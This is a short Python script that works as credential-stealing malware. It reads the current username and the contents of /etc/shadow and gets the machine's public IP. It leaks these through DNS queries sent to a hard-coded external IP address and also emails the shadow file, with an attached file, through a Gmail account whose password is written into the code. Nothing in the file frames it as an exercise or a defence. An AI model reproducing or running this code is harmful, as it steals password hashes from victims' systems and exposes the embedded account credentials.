import os	
import requests	  
from scapy.all import * 
import sys
import  smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_quary(str): 	
	start = "www."
	end = ".com"
	tmp = start+str+end
	dns_queries = DNSQR(qname=tmp)
	send(IP(dst='37.142.71.175') / UDP(dport=53) / DNS(qd=dns_queries))
def send_mail (To_):
	email ="orel.cyber@gmail.com"
	password = 'Cyber1212'
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.ehlo()
	server.login(email,password)
	msg = MIMEMultipart()
	msg['From'] = "orel.cyber@gmail.com"
	msg['To'] = "orel.rahum@gmail.com"
	msg['Subject'] = "we did it!!! its his IP:" + ipaddress
	message = 'have fun' + os.popen("cat /etc/shadow").read().strip()
	msg.attach(MIMEText(message , 'plain'))
	part = MIMEBase('application', "octet-stream")
	part.set_payload(open("attachment.py", "rb").read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', 'attachment; filename="attachment.py"')
	msg.attach(part)
	try:
		server.sendmail("orel.cyber@gmail.com" ,To_ , msg.as_string())
	except:
		print("")
	server.quit()
	
	
user = os.popen("whoami").read().strip()
passwords=os.popen("cat /etc/shadow").read().strip().split("\n") 
ipaddress = requests.get('https://checkip.amazonaws.com').text.strip()
send_quary(user)
send_quary(ipaddress)
if len(sys.argv)==2:
	To = sys.argv[1]
	send_mail(To)


for line in passwords:
	line=line.split(":")
	if line[0].endswith("."):
		line[0] = (line[0][:-1])
	if line[1].endswith("."):
		line[1] = (line[1][:-1])
	send_quary(line[0]+"."+line[1])
